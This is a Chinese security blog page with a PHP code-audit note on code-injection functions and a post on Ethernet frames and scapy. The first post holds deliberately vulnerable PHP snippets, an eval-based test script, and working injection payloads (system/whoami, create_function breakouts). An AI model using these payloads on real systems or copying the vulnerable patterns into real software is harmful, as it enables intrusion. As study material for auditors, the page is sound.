<!DOCTYPE html>





<html lang="zh-Hans">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 3.5.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.0">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.0">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.0">
  <link rel="mask-icon" href="/images/logo.svg?v=7.4.0" color="#222">

<link rel="stylesheet" href="/css/main.css?v=7.4.0">


<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">


<script id="hexo-configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '7.4.0',
    exturl: false,
    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
    copycode: {"enable":false,"show_result":false,"style":null},
    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
    bookmark: {"enable":false,"color":"#222","save":"auto"},
    fancybox: false,
    mediumzoom: false,
    lazyload: false,
    pangu: false,
    algolia: {
      appID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    },
    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
    path: '',
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    translation: {
      copy_button: 'Kopieren',
      copy_success: 'Kopiert',
      copy_failure: 'Kopieren fehlgeschlagen'
    },
    sidebarPadding: 40
  };
</script>

  <meta property="og:type" content="website">
<meta property="og:title" content="hl0rey&#39;s blog">
<meta property="og:url" content="http://hl0rey.github.io/page/2/index.html">
<meta property="og:site_name" content="hl0rey&#39;s blog">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="hl0rey&#39;s blog">
  <link rel="canonical" href="http://hl0rey.github.io/page/2/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome: true,
    isPost: false,
    isPage: false,
    isArchive: false
  };
</script>

  <title>hl0rey's blog</title>
  








  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .logo,
  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
  <div class="container use-motion">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-meta">

    <div>
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">hl0rey's blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
  </div>

  <div class="site-nav-toggle">
    <button aria-label="Navigationsleiste an/ausschalten">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>


<nav class="site-nav">
  
  <ul id="menu" class="menu">
      
      
      
        
        <li class="menu-item menu-item-home">
      
    

    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Startseite</a>

  </li>
      
      
      
        
        <li class="menu-item menu-item-archives">
      
    

    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archiv</a>

  </li>
  </ul>

    

</nav>
</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <div id="posts" class="posts-expand">
        <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://hl0rey.github.io/2018/02/19/代码审计之代码执行/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="hl0rey">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hl0rey's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2018/02/19/代码审计之代码执行/" class="post-title-link" itemprop="url">代码审计之代码执行</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Veröffentlicht am</span>

              
                
              

              <time title="Erstellt: 2018-02-19 15:34:35 / Geändert am: 18:15:21" itemprop="dateCreated datePublished" datetime="2018-02-19T15:34:35+08:00">2018-02-19</time>
            </span>
          
            

            
          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">in</span>
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/code/" itemprop="url" rel="index"><span itemprop="name">code</span></a></span>

                
                
              
            </span>
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <pre><code>为了让程序更加灵活，能够迎合复杂的需求。常常需要程序可以动态执行代码。当在动态执行的代码可以控制的时候，则很可能出现代码执行（代码注入）漏洞。
</code></pre><h3 id="动态执行代码的情况"><a href="#动态执行代码的情况" class="headerlink" title="动态执行代码的情况"></a>动态执行代码的情况</h3><ul>
<li><p>直接执行代码的函数</p>
<pre><code>eval
assert
preg_replace
</code></pre></li>
<li><p>回调函数</p>
<pre><code>call_usr_func
call_usr_func_array
array_map
</code></pre></li>
<li><p>函数动态执行</p>
<pre><code>$a($b)
</code></pre></li>
</ul>
<h3 id="具体分析："><a href="#具体分析：" class="headerlink" title="具体分析："></a>具体分析：</h3><h4 id="一、直接代码执行的函数"><a href="#一、直接代码执行的函数" class="headerlink" title="一、直接代码执行的函数"></a>一、直接代码执行的函数</h4><p>1.eval()：<br><a href="http://php.net/eval" target="_blank" rel="noopener">http://php.net/eval</a></p>
<pre><code>eval($a)
</code></pre><p>字符串a带入就可以执行，这个太容易利用了<br>值得一提的是eval不能被可变函数调用</p>
<p>2.assert()：<br><a href="http://php.net/manual/zh/function.assert.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.assert.php</a></p>
<pre><code>assert($a)
</code></pre><p>参数a是个字符串，assert函数会把他当作代码执行</p>
<p>3.preg_replace() php5.5之前可用<br><a href="http://php.net/manual/zh/function.preg-replace.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.preg-replace.php</a></p>
<pre><code>mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )
</code></pre><p>简化一下</p>
<pre><code>preg_replace($a,$b,$c)
</code></pre><p>参数 a、b、c可以是字符串也可以是数组，此处参数a、b、c可以注入<br>a）参数a注入是构造字符串使参数a含有“/e”，并且参数b在反向引用结束之后符合eval语法。也就是这个过程，用正则a去匹配c，得到捕获组，然后反向引用取到捕获组的内容，如果此时的字符串符合eval语法，就代码执行了。下面这两篇文章是介绍反向引用的<br><a href="http://blog.csdn.net/lxcnn/article/details/4146148" target="_blank" rel="noopener">http://blog.csdn.net/lxcnn/article/details/4146148</a><br><a href="http://www.cnblogs.com/-ShiL/archive/2012/04/06/Star201204061009.html" target="_blank" rel="noopener">http://www.cnblogs.com/-ShiL/archive/2012/04/06/Star201204061009.html</a></p>
<ul>
<li><p>示例：<br>php代码：</p>
<pre><code>&lt;?php preg_replace($_GET[‘reg’],”\\1”,”ph1phpinfoph1”);?&gt;
</code></pre></li>
</ul>
<p>payload：<br>www.test.com/test.php?reg=/ph1(.*?)ph1/e</p>
<p>b)参数b注入就十分简单了，但是必须正则a使用了e修饰符，直接穿传符合eval语法的字符串就行了<br>示例：<br>php代码：</p>
<pre><code>&lt;?php preg_replace(“/test/e”,$_GET[‘cmd’],”test”);?&gt;
</code></pre><p>payload：<br>www.test.com/test.php?cmd=phpinfo()<br>c）参数c的注入跟参数a类似，只要让参数b取得的字符串符合eval语法就行了。<br>示例：<br>php代码：</p>
<pre><code>&lt;?php preg_replace(“/ph1(.*?)php/e”,”\\1”,$_GET[‘cmd’]);?&gt;
</code></pre><p>payload:<br>www.test.com/test.php?cmd=ph1phpinfo()ph1<br>`    </p>
<p>4.create_function()<br><a href="http://php.net/manual/zh/function.create-function.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.create-function.php</a></p>
<pre><code>string create_function ( string $args , string $code )
create_function($a,$b)
</code></pre><p>这个函数在内部执行的eval，也就是说解析传入的参数，构造一段创建函数的符合eval语法的字符串，然后直接执行他。这里的参数b可以注入代码。<br>示例：<br>php代码：</p>
<pre><code>&lt;?php
//02-8.php?id=2;}phpinfo();/*
$id=$_GET[&apos;id&apos;];
$str2=&apos;echo  ‘.$a.’ test&apos;.$id.&quot;;&quot;;
echo $str2;
echo &quot;&lt;br/&gt;&quot;;
echo &quot;==============================&quot;;
echo &quot;&lt;br/&gt;&quot;;
$f1 = create_function(&apos;$a&apos;,$str2);
echo &quot;&lt;br/&gt;&quot;;
echo &quot;==============================&quot;;
?&gt;
</code></pre><p>payload:<br><a href="http://127.0.0.1/test.php?id=2;}phpinfo();/*" target="_blank" rel="noopener">http://127.0.0.1/test.php?id=2;}phpinfo();/*</a><br>绕过一下<br><a href="http://127.0.0.1/test.php?id=;}@phpinfo();/*" target="_blank" rel="noopener">http://127.0.0.1/test.php?id=;}@phpinfo();/*</a></p>
<p>原本字符串：<br>    function fT($a) {<br>      echo “test”.$a;<br>    }</p>
<p>注入后字符串：</p>
<pre><code>function fT($a) {
  echo &quot;test&quot;;}
  phpinfo();/*;//此处为注入代码。
}

&lt;?php
$foobar = $_GET[&apos;foobar&apos;];
$dyn_func = create_function(&apos;$foobar&apos;, &quot;echo $foobar;&quot;);
$dyn_func(&apos;&apos;);
?&gt;
</code></pre><p>我们提交 <a href="http://127.0.0.1/create_function.php?foobar=system%28dir%29" target="_blank" rel="noopener">http://127.0.0.1/create_function.php?foobar=system%28dir%29</a> 执行dir命令</p>
<p>5.call_user_func()<br><a href="http://php.net/manual/zh/function.call-user-func.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.call-user-func.php</a></p>
<pre><code>mixed call_user_func ( callable $callback [, mixed $parameter [, mixed $... ]] )
call_user_func($a)
</code></pre><p>参数a是调用的函数名，想办法让这里变成自己想要的函数名,如果还要个参数可控就更好了</p>
<p>示例：<br>php代码：</p>
<pre><code>&lt;?php call_user_func($_GET[‘code’]);?&gt;
&lt;?php call_user_func($_GET[‘code’],$_GET[‘cmd’]);?&gt;
</code></pre><p>payload：<br>www.test.com/test.php?code=phpinfo<br><a href="http://127.0.0.1/test.php?code=system&amp;cmd=whoami" target="_blank" rel="noopener">http://127.0.0.1/test.php?code=system&amp;cmd=whoami</a></p>
<p>6.call_user_func_array()<br><a href="http://php.net/manual/zh/function.call-user-func-array.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.call-user-func-array.php</a></p>
<pre><code>mixed call_user_func_array ( callable $callback , array $param_arr )
call_user_func_array($a,$b)
</code></pre><p>跟call_user_func差不多，但是这个必须带参数。<br>127.0.0.1/test.php?func=phpinfo&amp;p[]= 此处为空不能执行<br>php代码：</p>
<pre><code>&lt;?php call_user_func_array($_GET[&apos;func&apos;],$_GET[&apos;p&apos;]);?&gt;
</code></pre><p>payload:<br><a href="http://127.0.0.1/test.php?func=system&amp;p[]=whoami" target="_blank" rel="noopener">http://127.0.0.1/test.php?func=system&amp;p[]=whoami</a></p>
<p>7.ob_start() php7未测试成功<br><a href="http://php.net/manual/zh/function.ob-start.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.ob-start.php</a></p>
<pre><code>bool ob_start ([ callback $output_callback [, int $chunk_size [, bool $erase ]]] )
ob_start($a)
</code></pre><p>参数a是一个回调函数名，当缓存刷新时，把缓冲区的内容作为一个参数传给回    调函数处理，回调函数内不能再调用ob_start().</p>
<pre><code>$foobar = &apos;system&apos;;
ob_start($foobar);
echo &apos;dir&apos;;
ob_end_flush();
</code></pre><p>8.array_map()<br><a href="http://php.net/manual/zh/function.array-map.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.array-map.php</a></p>
<p>array array_map ( callable $callback , array $array1 [, array $… ] )<br>示例：</p>
<pre><code>&lt;?php array_map(&apos;system&apos;,$_GET[&apos;cmd&apos;]);?&gt;
</code></pre><p><a href="http://127.0.0.1/test.php?cmd[]=whoami" target="_blank" rel="noopener">http://127.0.0.1/test.php?cmd[]=whoami</a></p>
<p>9.array_walk(),array_walk_recursive()<br><a href="http://php.net/manual/zh/function.array-walk.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.array-walk.php</a><br><a href="http://php.net/manual/zh/function.array-walk-recursive.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.array-walk-recursive.php</a><br>bool array_walk ( array &amp;$array , callable $callback [, mixed $userdata = NULL ] )<br>bool array_walk_recursive ( array &amp;$array , callable $callback [, mixed $userdata = NULL ] )<br>array_walk($a,$b)<br>array_walk_recursive($a,$b)<br>参数a是个数组，参数b是个回调函数的名字，这两个函数都是把数组中的值作为参数带到回调函数中执行。第二个可以遍历多维数组。</p>
<pre><code>&lt;？php array_walk($_GET[&apos;cmd&apos;],&apos;system&apos;);
array_walk_recursive($_GET[&apos;cmd&apos;],&apos;system&apos;); ?&gt;
</code></pre><p><a href="http://127.0.0.1/test.php?cmd[]=whoami" target="_blank" rel="noopener">http://127.0.0.1/test.php?cmd[]=whoami</a></p>
<p>10.register_shutdown_function()<br><a href="http://php.net/manual/zh/function.register-shutdown-function.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.register-shutdown-function.php</a></p>
<pre><code>void register_shutdown_function ( callable $callback [, mixed $parameter [, mixed $... ]] )
</code></pre><p>register_shutdown_function($a)<br>参数a是一个函数名，也可以给他传参,可以传多个<br>register_shutdown_function($a,$b)<br>示例</p>
<pre><code>&lt;?php register_shutdown_function(&apos;system&apos;,$_GET[&apos;cmd&apos;]);?&gt;
</code></pre><p><a href="http://127.0.0.1/test.php?cmd=whoami" target="_blank" rel="noopener">http://127.0.0.1/test.php?cmd=whoami</a></p>
<pre><code>&lt;?php register_shutdown_function($_GET[&apos;cmd&apos;]);?&gt;
</code></pre><p><a href="http://127.0.0.1/test.php?cmd=phpinfo" target="_blank" rel="noopener">http://127.0.0.1/test.php?cmd=phpinfo</a></p>
<p>11.preg_replace_callback(),preg_replace_callback_array<br><a href="http://php.net/manual/zh/function.preg-replace-callback.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.preg-replace-callback.php</a></p>
<pre><code>mixed preg_replace_callback ( mixed $pattern , callable $callback , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )
http://php.net/manual/zh/function.preg-replace-callback-array.php
mixed preg_replace_callback_array ( array $patterns_and_callbacks , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )
</code></pre><p>这个函数太麻烦先算了。</p>
<p>13.array_filter()<br><a href="http://php.net/manual/zh/function.array-filter.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.array-filter.php</a></p>
<pre><code>array array_filter ( array $array [, callable $callback [, int $flag = 0 ]] )
</code></pre><p><a href="http://php.net/manual/zh/function.array-reduce.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.array-reduce.php</a></p>
<pre><code>mixed array_reduce ( array $array , callable $callback [, mixed $initial = NULL ] )这俩跟array_walk()执行代码的方式一样
</code></pre><p>14.stream_filter_register()<br><a href="http://php.net/manual/zh/function.stream-filter-register.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.stream-filter-register.php</a><br>自己构造一个类贼六啊<br>15.剩下的可能执行代码的函数<br>回调函数的构造比较复杂，当遇上的时候再具体分析。</p>
<pre><code>xml_set_character_data_handler()
xml_set_default_handler()
xml_set_element_handler()
xml_set_end_namespace_decl_handler()
xml_set_external_entity_ref_handler()
xml_set_notation_decl_handler()
xml_set_processing_instruction_handler()
xml_set_start_namespace_decl_handler()
xml_set_unparsed_entity_decl_handler()
stream_filter_register()
set_error_handler()
usort(),uasort(), uksort()array_diff_uassoc(),
array_diff_ukey()
array_udiff(), array_udiff_assoc(), array_udiff_uassoc()
array_intersect_assoc(), array_intersect_uassoc()
array_uintersect(), array_uintersect_assoc(), array_uintersect_uassoc()
</code></pre><p>16.这个没看懂怎么注入代码，比较反人类</p>
<pre><code>register_tick_function()
</code></pre><h1 id="危险函数集合"><a href="#危险函数集合" class="headerlink" title="危险函数集合"></a>危险函数集合</h1><pre><code>直接执行代码
eval()
assert()
preg_replace()(php7不支持.5.5以后废弃改成preg_replace _callback(）

可以控制函数内容
create_function()

能控制函数参数和函数名
较容易
call_user_func（），call_user_func_array（）
ob_start()，
array_map()，array_walk(),array_walk_recursive()
register_shutdown_function()
preg_replace _callback()
array_filter()
array_reduce()


比较困难，参数可控但是有限制
xml_set_character_data_handler()
xml_set_default_handler()
xml_set_element_handler()
xml_set_end_namespace_decl_handler()
xml_set_external_entity_ref_handler()
xml_set_notation_decl_handler()
xml_set_processing_instruction_handler()
xml_set_start_namespace_decl_handler()
xml_set_unparsed_entity_decl_handler()

stream_filter_register()

set_error_handler()

usort(),uasort(), uksort()array_diff_uassoc(),
array_diff_ukey()
array_udiff(), array_udiff_assoc(), array_udiff_uassoc()
array_intersect_assoc(), array_intersect_uassoc()
array_uintersect(), array_uintersect_assoc(), array_uintersect_uassoc()

register_tick_function()
</code></pre><h3 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h3><pre><code>&lt;?php

//36个函数或者语句可以代码执行
//代码执行函数 eval，assert,preg_replace(php7不支持.5.5以后废弃),create_function,ob_start()

//assert http://php.net/manual/zh/function.assert.php https://yq.aliyun.com/articles/27402
//preg_replace http://php.net/manual/zh/function.preg-replace.php https://zhidao.baidu.com/question/240565568.html
//ob_start http://blog.csdn.net/qq_22533095/article/details/50372150


/*
 * 同类型函数还有很多
array_map()
usort(), uasort(), uksort()
array_filter()
array_reduce()
array_diff_uassoc(), array_diff_ukey()
array_udiff(), array_udiff_assoc(), array_udiff_uassoc()
array_intersect_assoc(), array_intersect_uassoc()
array_uintersect(), array_uintersect_assoc(), array_uintersect_uassoc()
array_walk(), array_walk_recursive()
xml_set_character_data_handler()
xml_set_default_handler()
xml_set_element_handler()
xml_set_end_namespace_decl_handler()
xml_set_external_entity_ref_handler()
xml_set_notation_decl_handler()
xml_set_processing_instruction_handler()
xml_set_start_namespace_decl_handler()
xml_set_unparsed_entity_decl_handler()
stream_filter_register()
set_error_handler()
register_shutdown_function()
register_tick_function()
 * */


$codes = &apos;&apos;;
$original = &apos;eval&apos;;

if ($_POST[&apos;lv&apos;] == 1) {

    $codes = $_POST[&apos;code&apos;];

}

if (isset($_POST[&apos;func&apos;])) {
    $original = str_replace(&apos; &apos;, &apos;&apos;, $_POST[&apos;func&apos;]);
}


if ($original == &apos;eval&apos;) {

    eval(&apos;echo &apos; . $codes);

}
if ($original == &apos;assert&apos;) {

    assert(&apos;1=&apos; . $codes);


}

if ($original == &apos;create_function&apos;) {
    $func = create_function(&apos;$a&apos;, &apos;echo $a&apos;);
    $func($codes);
}

if ($original == &apos;dynamic&apos;) {

    $codes();

}

if ($original == &apos;preg_replace&apos;) {
    function test($a){
    echo $a;
    }
    //echo preg_replace(&quot;/\s*php(.+?)\/php\s*/ies&quot;, &quot;\\1&quot;, $_GET[&apos;h&apos;]);
    echo preg_replace(&quot;/s*[php](.+?)[/php]s*/ies&quot;, &apos;test(&quot;\1&quot;)&apos;, $codes);
}
if ($original==&apos;ob_start&apos;){

    ob_start($codes);
    echo &apos;echo &quot;codeexec&quot;&apos;;
    ob_end_flush();


}

if ($original==&apos;unserialize&apos;){

    //此处应当另行探究，主要研究php，反序列化

}
</code></pre>
        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
        <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://hl0rey.github.io/2018/02/18/以太网协议详解/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="hl0rey">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hl0rey's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2018/02/18/以太网协议详解/" class="post-title-link" itemprop="url">以太网协议详解</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Veröffentlicht am</span>

              
                
              

              <time title="Erstellt: 2018-02-18 21:02:34" itemprop="dateCreated datePublished" datetime="2018-02-18T21:02:34+08:00">2018-02-18</time>
            </span>
          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Bearbeitet am</span>
                <time title="Geändert am: 2018-02-21 22:11:40" itemprop="dateModified" datetime="2018-02-21T22:11:40+08:00">2018-02-21</time>
              </span>
            
          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">in</span>
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/code/" itemprop="url" rel="index"><span itemprop="name">code</span></a></span>

                
                
              
            </span>
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>参考链接<br><a href="http://blog.csdn.net/xiao628945/article/details/8006022" target="_blank" rel="noopener">http://blog.csdn.net/xiao628945/article/details/8006022</a></p>
<h3 id="各协议在模型中的位置"><a href="#各协议在模型中的位置" class="headerlink" title="各协议在模型中的位置"></a>各协议在模型中的位置</h3><pre><code>TCP/IP: 
网络接口层（链路层）：
网络层： IP,ICMP,IGMP，【ARP,RARP】
传输层：TCP ,UDP,UGP
应用层：Telnet,FTP,SMTP,SNMP.

OSI:
物理层：EIA/TIA-232, EIA/TIA-499, V.35, V.24, RJ45, Ethernet, 802.3, 802.5, FDDI, NRZI, NRZ, B8ZS
数据链路层：Frame Relay, HDLC, PPP, IEEE 802.3/802.2, FDDI, ATM,  IEEE 802.5/802.2
网络层：IP，IPX，AppleTalk DDP，【ARP,RARP】
传输层：TCP，UDP，SPX
会话层：RPC,SQL,NFS,NetBIOS,names,AppleTalk,ASP,DECnet,SCP
表示层:TIFF,GIF,JPEG,PICT,ASCII,EBCDIC,encryption,MPEG,MIDI,HTML
应用层：FTP,WWW,Telnet,NFS,SMTP,Gateway,SNMP
</code></pre><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><pre><code>以太网协议中应用最广泛的是　Ethernet II　协议，也是 scapy 支持的协议．
</code></pre><h3 id="数据包结构详解"><a href="#数据包结构详解" class="headerlink" title="数据包结构详解"></a>数据包结构详解</h3><p><img src="/2018/02/18/以太网协议详解/1.png" alt=""> </p>
<ul>
<li><p>包头结构</p>
<pre><code>typedef struct ethdr //以太网包头14字节
{
unsigned char destination_mac[6];//目标MAC 6字节
unsigned char source_mac[6];//源MAC 6字节
unsigned short type;//后面的协议类型2字节 为0806表示后面跟的包为ARP包
}ET_HEADER,*PETHDR; 
</code></pre></li>
<li><p>type字段的常见值及其意义<br><img src="/2018/02/18/以太网协议详解/2.png" alt=""> </p>
<pre><code>Ethertype ( 十六进制 )   协议   
0x0000 - 0x05DC   IEEE 802.3 长度   
0x0101 – 0x01FF   实验   
0x0600   XEROX NS IDP   
0x0660 0x0661   DLOG   
0x0800   网际协议（IP）   
0x0801   X.75 Internet   
0x0802   NBS Internet   
0x0803   ECMA Internet   
0x0804   Chaosnet   
0x0805   X.25 Level 3   
0x0806   地址解析协议（ARP ： Address Resolution Protocol）   
0x0808   帧中继 ARP （Frame Relay ARP） [RFC1701]   
0x6559   原始帧中继（Raw Frame Relay） [RFC1701]   
0x8035   动态 DARP （DRARP：Dynamic RARP） 反向地址解析协议（RARP：Reverse Address Resolution Protocol）   
0x8037   Novell Netware IPX   
0x809B   EtherTalk   
0x80D5   IBM SNA Services over Ethernet   
0x 80F 3   AppleTalk 地址解析协议（AARP：AppleTalk Address Resolution Protocol）   
0x8100   以太网自动保护开关（EAPS：Ethernet Automatic Protection Switching）   
0x8137   因特网包交换（IPX：Internet Packet Exchange）   
0x 814C   简单网络管理协议（SNMP：Simple Network Management Protocol）   
0x86DD   网际协议v6 （IPv6，Internet Protocol version 6）   
0x880B   点对点协议（PPP：Point-to-Point Protocol）   
0x 880C   通用交换管理协议（GSMP：General Switch Management Protocol）   
0x8847   多协议标签交换（单播） MPLS：Multi-Protocol Label Switching &lt;unicast&gt;）   
0x8848   多协议标签交换（组播）（MPLS, Multi-Protocol Label Switching &lt;multicast&gt;）   
0x8863   以太网上的 PPP（发现阶段）（PPPoE：PPP Over Ethernet &lt;Discovery Stage&gt;）   
0x8864   以太网上的 PPP（PPP 会话阶段） （PPPoE，PPP Over Ethernet&lt;PPP Session Stage&gt;）   
0x88BB   轻量级访问点协议（LWAPP：Light Weight Access Point Protocol）   
0x88CC   链接层发现协议（LLDP：Link Layer Discovery Protocol）   
0x8E88   局域网上的 EAP（EAPOL：EAP over LAN）   
0x9000   配置测试协议（Loopback）   
0x9100   VLAN 标签协议标识符（VLAN Tag Protocol Identifier）   
0x9200   VLAN 标签协议标识符（VLAN Tag Protocol Identifier）   
0xFFFF   保留
</code></pre><h3 id="scapy"><a href="#scapy" class="headerlink" title="scapy"></a>scapy</h3><p>  执行 ls(Ether)，回显如下：</p>
<p>  dst        : DestMACField         = (None) //目的MAC<br>  src        : SourceMACField       = (None)//源MAC<br>  type       : XShortEnumField      = (36864)//上层协议类型</p>
</li>
</ul>
<pre><code>通常不用手动构造以太头
</code></pre><h4 id="scapy的几个发包的方法"><a href="#scapy的几个发包的方法" class="headerlink" title="scapy的几个发包的方法"></a>scapy的几个发包的方法</h4><pre><code>send()方法在三层定义和发送数据包，也就是说，用户不用自己考虑路由（不用自己选接口），和以太头．

    send(IP(dst=&quot;www.baidu.com&quot;)/ICMP())
    .
    Sent 1 packets.



sendp()方法在二层定义和发送数据包，需要自己指定接口，和加上以太头．

    sendp(Ether()/IP(dst=&quot;www.baidu.com&quot;)/ICMP(),iface=&quot;wlan0&quot;,loop=1,inter=0.2)

    loop=1时循环发包，等于0时不循环．
    inter是发包的秒数间隔

sr()方法在三层发包，返回一个元组，

    n [32]: i
    Out[32]: 
    (&lt;Results: TCP:0 UDP:0 ICMP:1 Other:0&gt;,
     &lt;Unanswered: TCP:0 UDP:0 ICMP:0 Other:0&gt;)


    In [36]: i[0].summary()
    IP / ICMP 192.168.1.104 &gt; 111.13.100.92 echo-request 0 ==&gt; IP / ICMP 111.13.100.92 &gt; 192.168.1.104 echo-reply 0

    In [37]: i[0].show
    Out[37]: &lt;bound method PacketList.show of &lt;Results: TCP:0 UDP:0 ICMP:1 Other:0&gt;&gt;

    In [38]: i[0].show()
    0000 IP / ICMP 192.168.1.104 &gt; 111.13.100.92 echo-request 0 ==&gt; IP / ICMP 111.13.100.92 &gt; 192.168.1.104 echo-reply 0

    In [39]: i[1].show()

    In [40]: 

sr1()方法，只返回一个相应包
srp()方法在二层发包．
</code></pre><h4 id="查看scapy内置的工具："><a href="#查看scapy内置的工具：" class="headerlink" title="查看scapy内置的工具："></a>查看scapy内置的工具：</h4><pre><code>lsc()

回显：

arpcachepoison      : 向目标机器ARP缓存投毒，指定一个这样的 (your MAC,victim&apos;s IP) 元组．
arping              : 发送ARP who-has requests 来扫描存活主机
bind_layers         : Bind 2 layers on some specific fields&apos; values
bridge_and_sniff    : Forward traffic between two interfaces and sniff packets exchanged
corrupt_bits        : Flip a given percentage or number of bits from bytes
corrupt_bytes       : Corrupt a given percentage or number of bytes from bytes
defrag              : defrag(plist) -&gt; ([not fragmented], [defragmented],
defragment          : defragment(plist) -&gt; plist defragmented as much as possible 
dyndns_add          : Send a DNS add message to a nameserver for &quot;name&quot; to have a new &quot;rdata&quot;
dyndns_del          : Send a DNS delete message to a nameserver for &quot;name&quot;
etherleak           : Exploit Etherleak flaw
fragment            : Fragment a big IP datagram
fuzz                : Transform a layer into a fuzzy layer by replacing some default values by random objects
getmacbyip          : Return MAC address corresponding to a given IP address
hexdiff             : Show differences between 2 binary strings
hexdump             : --
hexedit             : Run external hex editor on a packet or bytes. Set editor in conf.prog.hexedit
is_private_addr     : Returns True if the IPv4 Address is an RFC 1918 private address.
is_promisc          : Try to guess if target is in Promisc mode. The target is provided by its ip.
linehexdump         : --
ls                  : List  available layers, or infos on a given layer
mtr                 : A Multi-Traceroute (mtr) command:
promiscping         : Send ARP who-has requests to determine which hosts are in promiscuous mode
rdpcap              : Read a pcap file and return a packet list
send                : Send packets at layer 3
sendp               : Send packets at layer 2
sendpfast           : Send packets at layer 2 using tcpreplay for performance
sniff               : Sniff packets
